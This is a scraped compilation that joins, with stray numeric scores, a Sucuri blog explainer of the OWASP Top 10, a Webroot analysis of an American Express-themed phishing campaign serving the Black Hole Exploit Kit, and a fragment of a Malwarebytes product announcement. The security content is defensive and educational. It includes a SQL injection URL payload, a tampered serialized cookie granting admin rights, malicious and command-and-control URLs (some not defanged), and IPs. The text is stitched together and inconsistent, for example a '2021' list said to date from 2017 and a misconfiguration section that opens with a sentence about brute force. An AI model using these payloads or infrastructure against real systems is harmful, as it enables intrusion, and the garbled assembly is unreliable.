OWASP Top 10 Security Risks & Vulnerabilities,0.009274352690059606
"Note: OWASP expects to complete the next major update of its Top Ten project sometime this year. And it’s considering a number of new contenders that have risen in prominence over the past 3-4 years. Follow us here for an update as soon as OWASP Top Ten 2021 officially drops. As of our post date, OWASP recently closed its call for input from the application security industry – hopefully indicating the new report will be coming soon.”.
When managing a website, it’s important to stay on top of the most critical security risks and vulnerabilities. The OWASP Top 10 is a great starting point to bring awareness to the biggest threats to websites in 2021.
What is OWASP?
OWASP stands for the Open Web Application Security Project, an online community that produces articles, methodologies, documentation, tools, and technologies in the field of web application security.
What is the OWASP Top 10?
OWASP Top 10 is the list of the 10 most common application vulnerabilities. It also shows their risks, impacts, and countermeasures. Updated every three to four years, the latest OWASP vulnerabilities list was released in 2017. Let’s dive into it!
The Top 10 OWASP vulnerabilities in 2021 are:",0.014951130847492111
"Injection
Broken authentication
Sensitive data exposure
XML external entities (XXE)
Broken access control
Security misconfigurations
Cross site scripting (XSS)
Insecure deserialization
Using components with known vulnerabilities
Insufficient logging and monitoring",0.015177985527661031
Stop OWASP Top 10 Vulnerabilities,0.010567083421291756
"Injection
A code injection happens when an attacker sends invalid data to the web application with the intention to make it do something that the application was not designed/programmed to do.
Perhaps the most common example around this security vulnerability is the SQL query consuming untrusted data. You can see one of OWASP’s examples below:
String query = “SELECT * FROM accounts WHERE custID = ‘” + request.getParameter(“id”) + “‘”;
This query can be exploited by calling up the web page executing it with the following URL: http://example.com/app/accountView?id=’ or ‘1’=’1 causing the return of all the rows stored on the database table.
The core of a code injection vulnerability is the lack of validation and sanitization of the data used by the web application, which means that this vulnerability can be present on almost any type of technology related to websites.
Anything that accepts parameters as input can potentially be vulnerable to a code injection attack.
We’ve written a lot about code injection attacks. One of the most recent examples is the SQL injection vulnerability in Joomla! 3.7.
Here is another example of an SQL injection that affected over half a million websites that had the YITH WooCommerce Wishlist plugin for WordPress:",0.007192408841201758
"The SQL injection shown above could cause a leak of sensitive data and compromise an entire WordPress installation.
How do you prevent code injection vulnerabilities?
Preventing code injection vulnerabilities really depends on the technology you are using on your website. For example, if you use WordPress, you could minimize code injection vulnerabilities by keeping it to a minimum of plugin and themes installed.
If you have a tailored web application and a dedicated team of developers, you need to make sure to have security requirements your developers can follow when designing and writing software. This will allow them to keep thinking about security during the lifecycle of the project.
Here are OWASP’s technical recommendations to prevent SQL injections:
Preventing SQL injections requires keeping data separate from commands and queries.",0.008890807431015557
"The preferred option is to use a safe API, which avoids the use of the interpreter entirely or provides a parameterized interface or migrate to use Object Relational Mapping Tools (ORMs).
Note: Even when parameterized, stored procedures can still introduce SQL injection if PL/SQL or T-SQL concatenates queries and data, or executes hostile data with EXECUTE IMMEDIATE or exec().
Use positive or “allowlist” server-side input validation. This is not a complete defense as many applications require special characters, such as text areas or APIs for mobile applications.
For any residual dynamic queries, escape special characters using the specific escape syntax for that interpreter.
Note: SQL structure such as table names, column names, and so on cannot be escaped, and thus user-supplied structure names are dangerous. This is a common issue in report-writing software.
Use LIMIT and other SQL controls within queries to prevent mass disclosure of records in case of SQL injection.",0.012483184423203841
From these recommendations you can abstract two things:,0.011641490250525965
"Separation of data from the web application logic.
Implement settings and/or restrictions to limit data exposure in case of successful injection attacks.",0.012295390253091454
"Without appropriate measure in place, code injections represent a serious risk to website owners. These attacks leverage security loopholes for a hostile takeover or the leaking of confidential information.",0.012725197707875169
"Broken Authentication
A broken authentication vulnerability can allow an attacker to use manual and/or automatic methods to try to gain control over any account they want in a system – or even worse – to gain complete control over the system.
Websites with broken authentication vulnerabilities are very common on the web. Broken authentication usually refers to logic issues that occur on the application authentication’s mechanism, like bad session management prone to username enumeration – when a malicious actor uses brute-force techniques to either guess or confirm valid users in a system.
To minimize broken authentication risks avoid leaving the login page for admins publicly accessible to all visitors of the website:",0.011614100618338452
"/administrator on Joomla!,
/wp-admin/ on WordPress,
/index.php/admin on Magento,
/user/login on Drupal.",0.010332697742057695
"The second most common form of this flaw is allowing users to brute force username/password combination against those pages.
Types of Broken Authentication Vulnerabilities
According to the OWASP Top 10, these vulnerabilities can come in many forms. A web application contains a broken authentication vulnerability if it:",0.015850609085651057
"Permits automated attacks such as credential stuffing, where the attacker has a list of valid usernames and passwords.
Permits brute force or other automated attacks.
Permits default, weak, or well-known passwords, such as”Password1″ or “admin/admin.″
Uses weak or ineffective credential recovery and forgot-password processes, such as “knowledge-based answers,” which cannot be made safe.
Uses plain text, encrypted, or weakly hashed passwords.
Has missing or ineffective multi-factor authentication.
Exposes session IDs in the URL (e.g., URL rewriting).
Does not rotate session IDs after successful login.
Does not properly invalidate session IDs. User sessions or authentication tokens (particularly single sign-on (SSO) tokens) aren’t properly invalidated during logout or a period of inactivity.",0.014042954465386726
"Writing insecure software results in most of these vulnerabilities. They can be attributed to many factors, such as lack of experience from the developers. It can also be the consequence of more institutionalized failures such as lack of security requirements or organizations rushing software releases, in other words, choosing working software over secure software.
How do you prevent broken authentication vulnerabilities?
In order to avoid broken authentication vulnerabilities, make sure the developers apply to the best practices of website security. Support them by providing access to external security audits and enough time to properly test the code before deploying to production.
OWASP’s technical recommendations are the following:",0.01244144684402404
"Where possible, implement multi-factor authentication to prevent automated, credential stuffing, brute force, and stolen credential reuse attacks.
Do not ship or deploy with any default credentials, particularly for admin users.
Implement weak-password checks, such as testing new or changed passwords against a list of the top 10,000 worst passwords.
Align password length, complexity and rotation policies with NIST 800-63 B’s guidelines in section 5.1.1 for Memorized Secrets or other modern, evidence-based password policies.
Ensure registration, credential recovery, and API pathways are hardened against account enumeration attacks by using the same messages for all outcomes.
Limit or increasingly delay failed login attempts. Log all failures and alert administrators when credential stuffing, brute force, or other attacks are detected.
Use a server-side, secure, built-in session manager that generates a new random session ID with high entropy after login. Session IDs should not be in the URL. Ids should also be securely stored and invalidated after logout, idle, and absolute timeouts.",0.016591299542034754
"Sensitive Data Exposure
Sensitive data exposure is one of the most widespread vulnerabilities on the OWASP list. It consists of compromising data that should have been protected.
Examples of Sensitive Data
Some sensitive data that requires protection is:",0.010416442919288893
"Credentials
Credit card numbers
Social Security Numbers
Medical information
Personally identifiable information (PII)
Other personal information",0.021141724788204086
"It is vital for any organization to understand the importance of protecting users’ information and privacy. All companies should comply with their local privacy laws.
Responsible sensitive data collection and handling have become more noticeable especially after the advent of the General Data Protection Regulation (GDPR). This is a new data privacy law that came into effect May 2018. It mandates how companies collect, modify, process, store, and delete personal data originating in the European Union for both residents and visitors.
There are two types of data:",0.02087074391930488
"Stored data – data at rest
Transmitted data – data that is transmitted internally between servers, or to web browsers",0.010032579100312522
"Protecting Data in Transit
Both types of data should be protected. When thinking about data in transit, one way to protect it on a website is by having an SSL certificate.
SSL is the acronym for Secure Sockets Layer. It is the standard security technology for establishing an encrypted link between a web server and a browser. SSL certificates help protect the integrity of the data in transit between the host (web server or firewall) and the client (web browser).
We have created a DIY guide to help every website owner on how to install an SSL certificate.
What are the risks of sensitive data exposure?
According to the OWASP Top 10, here are a few examples of what can happen when sensitive data is exposed:",0.01686284539006866
"Scenario #1: An application encrypts credit card numbers in a database using automatic database encryption. However, this data is automatically decrypted when retrieved, allowing an SQL injection flaw to retrieve credit card numbers in clear text.",0.009288303875095605
"Scenario #2: A site doesn’t use or enforce TLS for all pages or supports weak encryption. An attacker monitors network traffic (e.g. at an insecure wireless network), downgrades connections from HTTPS to HTTP, intercepts requests, and steals the user’s session cookie. The attacker then replays this cookie and hijacks the user’s (authenticated) session, accessing or modifying the user’s private data. Instead of the above they could alter all transported data, e.g. the recipient of a money transfer.
Scenario #3: The password database uses unsalted or simple hashes to store everyone’s passwords. A file upload flaw allows an attacker to retrieve the password database. All the unsalted hashes can be exposed with a rainbow table of pre-calculated hashes. Hashes generated by simple or fast hash functions may be cracked by GPUs, even if they were salted.",0.011010512729440314
"Why is sensitive data exposure so common?
Over the last few years, sensitive data exposure has been one of the most common attacks around the world. Some examples of data leaks that ended up in exposing sensitive data are:",0.01776573904306622
"The Brazilian C&A retail fashion retail clothing chain gift card platform cyberattack that happened in August 2018.
The Uber breach in 2016 that exposed the personal information of 57 million Uber users, as well as 600,000 drivers.
The Target store data breach that occurred around Thanksgiving exposing credit/debit card information and contact information of up to 110 million people.",0.012984889727956528
Not encrypting sensitive data is the main reason why these attacks are still so widespread. Even encrypted data can be broken due to weak:,0.012792637593547318
"Key generation process
Key management process
Algorithm usage
Protocol usage
Cipher usage
Password hashing storage techniques",0.010684293733075667
"This vulnerability is usually very hard to exploit; however, the consequences of a successful attack are dreadful. If you want to learn more, we have written a blog post on the Impacts of a Security Breach.
How to Prevent Data Exposure
Some of the ways to prevent data exposure, according to OWASP, are:",0.011060850758292329
"Classify data processed, stored, or transmitted by an application.
Identify which data is sensitive according to privacy laws, regulatory requirements, or business needs.
Apply controls as per the classification.
Don’t store sensitive data unnecessarily.
Discard it as soon as possible or use PCI DSS compliant tokenization or even truncation. Data that is not retained cannot be stolen.
Make sure to encrypt all sensitive data at rest.
Ensure up-to-date and strong standard algorithms, protocols, and keys are in place; use proper key management.
Encrypt all data in transit with secure protocols such as TLS with perfect forward secrecy (PFS) ciphers, cipher prioritization by the server, and secure parameters.
Enforce encryption using directives like HTTP Strict Transport Security (HSTS).
Disable caching for responses that contain sensitive data.
Store passwords using strong adaptive and salted hashing functions with a work factor (delay factor), such as Argon2, scrypt, bcrypt, or PBKDF2.
Verify independently the effectiveness of configuration and settings.",0.01916208782215212
"XML External Entities (XXE)
According to Wikipedia, an XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser.
Most XML parsers are vulnerable to XXE attacks by default. That is why the responsibility of ensuring the application does not have this vulnerability lays mainly on the developer.
What are the XML external entity attack vectors?
According to the OWASP Top 10, the XML external entities (XXE) main attack vectors include the exploitation of:",0.014098976269534158
"Vulnerable XML processors if malicious actors can upload XML or include hostile content in an XML document
Vulnerable code
Vulnerable dependencies
Vulnerable integrations",0.007849636091667112
"How to prevent XML external entity attacks
Some of the ways to prevent XML External Entity attacks, according to OWASP, are:",0.017323946190028305
"Whenever possible, use less complex data formats ,such as JSON, and avoid serialization of sensitive data.
Patch or upgrade all XML processors and libraries in use by the application or on the underlying operating system.
Use dependency checkers (update SOAP to SOAP 1.2 or higher).
Disable XML external entity and DTD processing in all XML parsers in the application, as per the OWASP Cheat Sheet ‘XXE Prevention.’
Implement positive (“allowlisting”) server-side input validation, filtering, or sanitization to prevent hostile data within XML documents, headers, or nodes.
Verify that XML or XSL file upload functionality validates incoming XML using XSD validation or similar.
SAST tools can help detect XXE in source code – although manual code review is the best alternative in large, complex applications with many integrations.",0.019189776817345683
"If these controls are not possible, consider using:",0.019485679322181926
"Virtual patching
API security gateways
Web Application Firewalls (WAFs) to detect, monitor, and block XXE attacks",0.016713768969052856
"Broken Access ControlIn website security, access control means putting a limit on what sections or pages visitors can reach, depending on their needs.
For example, if you own an ecommerce store, you probably need access to the admin panel in order to add new products or to set up a promotion for the upcoming holidays. However, hardly anybody else would need it. Allowing the rest of your website’s visitors to reach your login page only opens up your ecommerce store to attacks.
And that’s the problem with almost all major content management systems (CMS) these days. By default, they give worldwide access to the admin login page. Most of them also won’t force you to establish a two-factor authentication method (2FA).
The above makes you think a lot about software development with a security-first philosophy.
Examples of Broken Access Control
Here are some examples of what we consider to be “access”:",0.012714848028540504
"Access to a hosting control / administrative panel
Access to a server via FTP / SFTP / SSH
Access to a website’s administrative panel
Access to other applications on your server
Access to a database",0.009032299623487838
Attackers can exploit authorization flaws to the following:,0.007942451946355567
"Access unauthorized functionality and/or data
View sensitive files
Change access rights",0.007703676827390149
"What are the risks of broken access control?
According to OWASP, here are a few examples of what can happen when there is broken access control:",0.016622215655882733
"Scenario #1: The application uses unverified data in a SQL call that is accessing account information:
pstmt.setString(1,request.getParameter(“acct”)); ResultSetresults =pstmt.executeQuery( );
An attacker simply modifies the ‘acct’ parameter in the browser to send whatever account number they want. If not properly verified, the attacker can access any user’s account.
http://example.com/app/accountInfo?acct=notmyacct
Scenario #2: An attacker simply force browses to target URLs. Admin rights are required for access to the admin page.
http://example.com/app/getappInfo
http://example.com/app/admin_getappInfo",0.009404355176549473
"Developers are going to be more familiar with the above scenarios, but remember that broken access control vulnerabilities can be expressed in many forms through almost every web technology out there; it all depends on what you use on your website.
Reducing the Risks of Broken Access Control
There are things you can do to reduce the risks of broken access control:",0.0073913163195065135
"Employ least privileged concepts – apply a role appropriate to the task and only for the amount of time necessary to complete said task and no more.
Get rid of accounts you don’t need or whose user no longer requires them.
Audit your servers and websites – who is doing what, when, and why.
If possible, apply multi-factor authentication to all your access points.
Disable access points until they are needed in order to reduce your access windows.
Remove unnecessary services off your server.
Check applications that are externally accessible versus applications that are tied to your network.
If you are developing a website, bear in mind that a production box should not be the place to develop, test, or push updates without testing.",0.015870296585364208
"Broken Access Control Prevention
To avoid broken access control is to develop and configure software with a security-first philosophy. That’s why it is important to work with a developer to make sure there are security requirements in place.
The technical recommendations by OWASP to prevent broken access control are:",0.010859246080666685
"With the exception of public resources, deny by default.
Implement access control mechanisms once and reuse them throughout the application, including minimizing CORS usage.
Model access controls should enforce record ownership, rather than accepting that the user can create, read, update, or delete any record. Note: For example,  if a user logs in as “John,” he could only create, read, update or delete records associated with the ID of “John,” never the data from other users.
Unique application business limit requirements should be enforced by domain models.
Disable web server directory listing and ensure file metadata (e.g. .git) and backup files are not present within web roots.
Log access control failures, alert admins when appropriate (e.g. repeated failures). Note: We recommend our free plugin for WordPress websites, that you can download directly from the official WordPress repository.
Rate limit API and controller access to minimize the harm from automated attack tooling.
JWT tokens should be invalidated on the server after logout.
Developers and QA staff should include functional access control units and integration tests.",0.01652583644117045
"Security MisconfigurationsAt its core, brute force is the act of trying many possible combinations, but there are many variants of this attack to increase its success rate. Here are the most common:",0.009778172308287925
"Unpatched flaws
Default configurations
Unused pages
Unprotected files and directories
Unnecessary services",0.006558934296168384
"One of the most common webmaster flaws is keeping the CMS default configurations.
Today’s CMS applications (although easy to use) can be tricky from a security perspective for the end users. By far, the most common attacks are entirely automated. Many of these attacks rely on users to have only default settings.
This means that a large number of attacks can be mitigated by changing the default settings when installing a CMS.
There are settings you may want to adjust to control comments, users, and the visibility of user information. The file permissions are another example of a default setting that can be hardened.
Where can security misconfiguration happen?
Misconfiguration can happen at any level of an application stack, including:",0.012101603714828713
"Network services
Platform
Web server
Application server
Database
Frameworks
Custom code
Pre-installed virtual machines
Containers
Storage",0.007763904584308312
"One of the most recent examples of application misconfigurations is the memcached servers used to DDoS huge services in the tech industry.
Examples of Security Misconfiguration Attack Scenarios
According to OWASP, these are some examples of attack scenarios:",0.008063422623980854
"Scenario #1: The application server comes with sample applications that are not removed from the production server.
These sample applications have known security flaws that attackers use to compromise the server. If one of these applications is the admin console and default accounts weren’t changed, the attacker logs in with default passwords and takes over.",0.008016364246864027
"Scenario #2: Directory listing is not disabled on the server. An attacker discovers they can simply list directories. They find and download the compiled Java classes, which they decompile and reverse engineer to view the code. The attacker then finds a serious access control flaw in the application.
Scenario #3: The application server’s configuration allows detailed error messages, e.g. stack traces, to be returned to users. This potentially exposes sensitive information or underlying flaws, such as component versions. They are known to be vulnerable.
Scenario #4: A cloud service provider has default sharing permissions open to the Internet by other CSP users. This allows stored sensitive data to be accessed within cloud storage.",0.009771271957778604
"How to Have Secure Installation Systems
In order to prevent security misconfigurations:",0.007296753524494548
"A repeatable hardening process that makes it fast and easy to deploy another environment that is properly locked down. Development, QA, and production environments should all be configured identically, with different credentials used in each environment. Automate this process in order to minimize the effort required to set up a new secure environment.
A minimal platform without any unnecessary features, components, documentation, and samples. Remove or do not install unused features and frameworks.
A task to review and update the configurations appropriate to all security notes, updates, and patches as part of the patch management process. In particular, review cloud storage permissions.
A segmented application architecture that provides effective and secure separation between components or tenants, with segmentation, containerization, or cloud security groups.
Sending security directives to clients, e.g. Security Headers.
An automated process to verify the effectiveness of the configurations and settings in all environments.",0.01372364732870679
Cross-Site Scripting (XSS),0.015106357720316765
"Cross Site Scripting (XSS) is a widespread vulnerability that affects many web applications. XSS attacks consist of injecting malicious client-side scripts into a website and using the website as a propagation method.
The risks behind XSS is that it allows an attacker to inject content into a website and modify how it is displayed, forcing a victim’s browser to execute the code provided by the attacker while loading the page.
XSS is present in about two-thirds of all applications.
Generally, XSS vulnerabilities require some type of interaction by the user to be triggered, either via social engineering or via a visit to a specific page. If an XSS vulnerability is not patched, it can be very dangerous to any website.
Examples of  XSS Vulnerabilities
Imagine you are on your WordPress wp-admin panel adding a new post. If you are using a plugin with a stored XSS vulnerability that is exploited by a hacker, it can force your browser to create a new admin user while you’re in the wp-admin panel or it can edit a post and perform other similar actions.
An XSS vulnerability gives the attacker almost full control of the most important software of computers nowadays: the browsers.
Back in 2017, our research team disclosed a stored XSS vulnerability in the core of WordPress websites. Remote attackers could use this vulnerability to deface a random post on a WordPress site and store malicious JavaScript code in it.
Types of XSS
According to the OWASP Top 10, there are three types of cross-site scripting:",0.015453176512211675
"Reflected XSS: The application or API includes unvalidated and unescaped user input as part of HTML output. A successful attack can allow the attacker to execute arbitrary HTML and JavaScript in the victim’s browser. Typically the user will need to interact with some malicious link that points to an attacker-controlled page, such as malicious watering hole websites, advertisements, or similar.
Stored XSS: The application or API stores unsanitized user input that is viewed at a later time by another user or an administrator. Stored XSS is often considered high or critical risk.
DOM XSS: JavaScript frameworks, single-page applications, and APIs that dynamically include attacker-controllable data to a page are vulnerable to DOM XSS. Ideally, the application would not send attacker-controllable data to unsafe JavaScript APIs. Typical XSS attacks include session stealing, account takeover, MFA bypass, DOM-node replacement or defacement (such as Trojan login panels), attacks against the user’s browser such as malicious software downloads, keylogging, and other client-side attacks.",0.01691009495341511
"Reducing the Risks of XSS
There are technologies like the Sucuri Firewall designed to help mitigate XSS attacks. If you are a developer, here is some insight on how to identify and account for these weaknesses.
How to Prevent XSS Vulnerabilities
Preventive measures to reduce the chances of XSS attacks should take into account the separation of untrusted data from active browser content. OWASP guidelines gives some practical tips on how to achieve it:",0.012352868697689257
"Using frameworks that automatically escape XSS by design, such as the latest Ruby on Rails, React JS. Learn the limitations of each framework’s XSS protection and appropriately handle the use cases which are not covered.
Escaping untrusted HTTP request data based on the context in the HTML output (body, attribute, JavaScript, CSS, or URL) will resolve Reflected and Stored XSS vulnerabilities. The OWASP Cheat Sheet for XSS Prevention has details on the required data escaping techniques.
Applying context-sensitive encoding when modifying the browser document on the client side acts against DOM XSS. When this cannot be avoided, similar context-sensitive escaping techniques can be applied to browser APIs as described in the OWASP Cheat Sheet for DOM based XSS Prevention.
Enabling a content security policy (CSP) is a defense-in-depth mitigating control against XSS. It is effective if no other vulnerabilities exist that would allow placing malicious code via local file includes (e.g. path traversal overwrites or vulnerable libraries from permitted content delivery networks).",0.014834400221524158
"Insecure DeserializationNote: The OWASP Top 10 noted that this security risk was added by an industry survey and not based on quantifiable data research.
Every web developer needs to make peace with the fact that attackers/security researchers are going to try to play with everything that interacts with their application–from the URLs to serialized objects.
In computer science, an object is a data structure; in other words, a way to structure data. To make it easier to understand some key concepts:",0.008650727729673902
"The process of serialization is converting objects to byte strings.
The process of deserialization is converting byte strings to objects.",0.012070575281549867
"Examples of Insecure Deserialization Attack Scenarios
According to OWASP guidelines, here are some examples of attack scenarios:",0.02085055627020571
"Scenario #1: A React application calls a set of Spring Boot microservices. Being functional programmers, they tried to ensure that their code is immutable. The solution they came up with is serializing user state and passing it back and forth with each request. An attacker notices the “R00” Java object signature, and uses the Java Serial Killer tool to gain remote code execution on the application server.
Scenario #2: A PHP forum uses PHP object serialization to save a “super” cookie, containing the user’s user ID, role, password hash, and other state:
a:4:{i:0;i:132;i:1;s:7:”Mallory”;i:2;s:4:”user”;
i:3;s:32:”b6a8b3bea87fe0e05022f8f3c88bc960″;}
An attacker changes the serialized object to give themselves admin privileges:
a:4:{i:0;i:1;i:1;s:5:”Alice”;i:2;s:5:”admin”;
i:3;s:32:”b6a8b3bea87fe0e05022f8f3c88bc960″;}",0.01189676301660958
"One of the attack vectors presented by OWASP regarding this security risk was a super cookie containing serialized information about the logged-in user. The role of the user was specified in this cookie.
If an attacker is able to deserialize an object successfully, then modify the object to give himself an admin role, serialize it again. This set of actions could compromise the whole web application.
How to Prevent Insecure Deserializations
The best way to protect your web application from this type of risk is not to accept serialized objects from untrusted sources.
If you can’t do this, OWASP security provides more technical recommendations that you (or your developers) can try to implement:",0.00865265851973851
"Implementing integrity checks such as digital signatures on any serialized objects to prevent hostile object creation or data tampering.
Enforcing strict type constraints during deserialization before object creation as the code typically expects a definable set of classes. Bypasses to this technique have been demonstrated, so reliance solely on this is not advisable.
Isolating and running code that deserializes in low privilege environments when possible.
Logging deserialization exceptions and failures, such as where the incoming type is not the expected type, or the deserialization throws exceptions.
Restricting or monitoring incoming and outgoing network connectivity from containers or servers that deserialize.
Monitoring deserialization, alerting if a user deserializes constantly.",0.017913180911620308
"Using Components with Known VulnerabilitiesThese days, even simple websites such as personal blogs have a lot of dependencies.
We can all agree that failing to update every piece of software on the backend and frontend of a website will, without a doubt, introduce heavy security risks sooner rather than later.
For example, in 2019, 56% of all CMS applications were out of date at the point of infection.",0.010796912192673536
"The question is, why aren’t we updating our software on time? Why is this still such a huge problem today?
There are some possibilities, such as:",0.017386620396416474
"Webmasters/developers cannot keep up with the pace of the updates; after all, updating properly takes time.
Legacy code won’t work on newer versions of its dependencies.
Webmasters are scared that something will break on their website.
Webmasters don’t have the expertise to properly apply the update.",0.011541404310197234
"This might be a little too dramatic, but every time you disregard an update warning, you might be allowing a now known vulnerability to survive in your system. Trust us, cybercriminals are quick to investigate software and changelogs.
Whatever the reason for running out-of-date software on your web application, you can’t leave it unprotected. Both Sucuri and OWASP recommend virtual patching for the cases where patching is not possible.
Virtual patching affords websites that are outdated (or with known vulnerabilities) to be protected from attacks by preventing the exploitation of these vulnerabilities on the fly. This is usually done by a firewall and an intrusion detection system.
Vulnerable Applications
Vulnerable applications are usually outdated, according to OWASP guidelines, if:",0.01353942530994523
"You do not know the versions of all components you use (both client-side and server-side). This includes components you directly use as well as nested dependencies.
The software is vulnerable, unsupported, or out of date. This includes the OS, web/application server, database management system (DBMS), applications, APIs and all components, runtime environments, and libraries.
You do not know the versions of all components you use (both client-side and server-side). This includes components you directly use as well as nested dependencies.
You do not fix or upgrade the underlying platform, frameworks, and dependencies in a risk-based, timely fashion. This commonly happens in environments when patching is a monthly or quarterly task under change control, which leaves organizations open to many days or months of unnecessary exposure to fixed vulnerabilities.
The software developers do not test the compatibility of updated, upgraded, or patched libraries.
You do not secure the components’ configurations.",0.01330009573905755
"You can subscribe to our website security blog feed to be on top of security issues caused by vulnerable applications.
How to Avoid Using Components with Known Vulnerabilities
Some of the ways to prevent the use of vulnerable components are:",0.00723165223704092
"Remove all unnecessary dependencies.
Have an inventory of all your components on the client-side and server-side.
Monitor sources like Common Vulnerabilities and Disclosures (CVE) and National Vulnerability Database (NVD) for vulnerabilities in the components.
Obtain components only from official sources.
Get rid of components not actively maintained.
Use virtual patching with the help of a Website Application Firewall.",0.013871965167680855
"Insufficient Logging and MonitoringThe importance of securing a website cannot be understated. While 100% security is not a realistic goal, there are ways to keep your website monitored on a regular basis so you can take immediate action when something happens.
Not having an efficient logging and monitoring process in place can increase the damage of a website compromise.
Here at Sucuri, we highly recommend that every website is properly monitored. If you need to monitor your server, OSSEC is freely available to help you. OSSEC actively monitors all aspects of system activity with file integrity monitoring, log monitoring, root check, and process monitoring.
Example of Logging and Monitoring Attack Scenarios
According to OWASP, these are some examples of attack scenarios due to insufficient logging and monitoring:",0.013763065513252126
"Scenario #1: An open-source project forum software run by a small team was hacked using a flaw in its software. The attackers managed to wipe out the internal source code repository containing the next version and all of the forum contents. Although source could be recovered, the lack of monitoring, logging, or alerting led to a far worse breach. The forum software project is no longer active as a result of this issue.
Scenario #2: An attacker scans for users with a common password. They can take over all accounts with this password. For all other users, this scan leaves only one false login behind. After some days, this may be repeated with a different password.
Scenario #3: A major U.S. retailer reportedly had an internal malware analysis sandbox analyzing attachments. The sandbox software had detected potentially unwanted software, but no one responded to this detection. The sandbox had been producing warnings for some time before detecting the breach due to fraudulent card transactions by an external bank.",0.012813411204376957
"How to Have Efficient Website Monitoring
Keeping audit logs are vital to staying on top of any suspicious change to your website. An audit log is a document that records the events in a website so you can spot anomalies and confirm with the person in charge that the account hasn’t been compromised.
Whatever the reason for running out-of-date software on your web application, you can’t leave it unprotected. Both Sucuri and OWASP recommend virtual patching for the cases where patching is not possible.
We know that it may be hard for some users to perform audit logs manually. If you have a WordPress website, you can use our free WordPress Security Plugin to help you with your audit logs. The plugin can be downloaded from the official WordPress repository.
Vulnerable Applications
The Sucuri Website Security Platform has a comprehensive website monitoring solution that includes:",0.01164929063090503
"Remote monitoring
Website blocklist monitoring
Server-side monitoring
DNS monitoring
Uptime monitoring",0.013128832309486915
"Protect Your Website from Security Vulnerabilities
The Sucuri Website Security Platform can protect your site from the top 10 website threats and security risks. Sign up to have peace of mind.
",0.01902944528714834
"American Express cardholders, beware!
Over the past week, cybercriminals mass mailed millions of emails impersonating American Express, in an attempt to trick its customers into clicking on the malicious links found in the emails. Upon clicking on any of the links, users are redirected to a malicious URL serving cllient-side exploits courtesy of the Black Hole Exploit Kit.
More details:",0.014688926664494506
Sample screenshot of the spamvertised email:,0.010990132234593664
"Sample compromised URLs used in the campaign: hxxp://www.xn--snren-wua.net/amextrfail.html; hxxp://www.stellarkids.net/amextrfail.html; hxxp://abakus-baby.com/amextrfail.html; hxxp://www.balatonok.hu/amextrfail.html; hxxp://www.ardiabetes.org/amextrfail.html; hxxp://xfrz.cn/amextrfail.html; hxxp://kinga-aco.studiopresent.info/amextrfail.html; http://www.intech74.ru/amextrfail.html; http://wanpra.com/amextrfail.html; http://qr-codes.pedromorales.com/amextrfail.html; hxxp://relationshipcentral.org.my/amextrfail.html; hxxp://svetled.net/amextrfail.html; hxxp://plateenforcer.com/amextrfail.html; hxxp://marko.jumpquick.com/amextrfail.html; hxxp://familyfiles.joeinfo.org/amextrfail.html; hxxp://vawip.sapint.org/amextrfail.html; hxxp://www.xn--snren-wua.net/amextrfail.html; hxxp://uni-formsandservices.com/amextrfail.html; hxxp://www.svma.sd/amextrfail.html; hxxp://www.ardiabetes.org/amextrfail.html
Client-side exploits serving URLs: hxxp://stempare.net/detects/suited_awful_infinite_estimate.php; hxxp://stempare.net/detects/suited_awful_infinite_estimate.php?azfqtl=3833043409&zwe=47&wfamk=05340237360403353407&htks=0a000300040002
Malicious domain name reconnaissance:
stempare.net – 109.123.220.145, AS15685 – Email: rebe_bringhurst1228@i-connect.com
Name Server: NS1.TOPPAUDIO.COM – 91.216.93.61, AS50300 – Email: windowclouse@hotmail.com
Name Server: NS2.TOPPAUDIO.COM – 29.217.45.138 – Email: windowclouse@hotmail.com
We’ve already seen these name servers in the recently profiled “‘Your Discover Card Services Blockaded’ themed emails lead to Black Hole Exploit Kit“; “BofA ‘Online Banking Passcode Reset’ themed emails serve client-side exploits and malware“; “‘ADP Immediate Notification’ themed emails lead to Black Hole Exploit Kit“, indicating that all of these campaigns are managed by a single cybercriminal/gang of cybercriminals.
Upon loading of the malicious URL, a malicious PDF file exploiting CVE-2010-0188 is used to ultimately drops the actual payload – MD5: c8c607bc630ee2fe6a8c31b8eb03ed43 – detected by 2 out of 44 antivirus scanners as Trojan.Win32.Bublik.ptf.",0.014169045022359827
"Upon execution, the dropped malware requests a connection to 192.5.5.241:8080 and then establishes a connection with 210.56.23.100:8080/Ajtw/UCygrDAA/Ud+asDAA (AS7590, Commission For Science And Technology, Pakistan). The following domain responds to this IP: discozdata.org. It is currently blacklisted in 25 anti-spam lists.
The following URLs are known to have directly serving malicious content, and act as command and control servers in the past:
210.56.23.100:8080/asp/intro.php
210.56.23.100:8080/za/v_01_a/in
The following malicious URLs are known to have responsed to the same IP:
hxxp://poluicenotgo.ru:8080/internet/at.php?i=15
hxxp://uiwewsecondary.ru:8080/internet/fpkrerflfvd.php
hxxp://webmastaumuren.ru:8080/navigator/jueoaritjuir.php
hxxp://dedovshinaus.su:8080/pages/dq.php?i=15
hxxp://rushsjhdhfjsldif.su:8080/images/aublbzdni.php
hxxp://xstriokeneboleeodgons.ru:8080/images/jw.php?i=3D8
hxxp://debiudlasduisioa.ru/
hxxp://dkjhfkjsjadsjjfj.ru:8080/images/aublbzdni.php
hxxp://ckjsfhlasla.ru:8080/images/kobzfoivdpdzilx.php
hxxp://zolindarkksokns.ru:8080/images/jw.php?i=2
hxxp://caskjfhlkaspsfg.ru/images/dpcobsyscrctbt.jar
hxxp://csoaspfdpojuasfn.ru:8080/images/xqyndrbualfl.swf
The last time we came across this IP (210.56.23.100), was in July 2012’s analysis of yet another malicious campaign, this time impersonating American Airlines.
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.010888462744580774
"The New Malwarebytes Anti-Exploit 1.05
While we’re still riding high on Malwarebytes Anti-Exploit winning the V3 Security Innovation of the year award, we are also happy to announce the general availability of the new Malwarebytes Anti-Exploit 1.05.1.1014.
While with 0.10 beta we did a complete re-write of the underlying service architecture, this build is a complete re-write or refactor of the protection DLL. This refactoring greatly improves the overall stability and reduces most known conflicts with third-party applications as detailed in the Known Issues list.
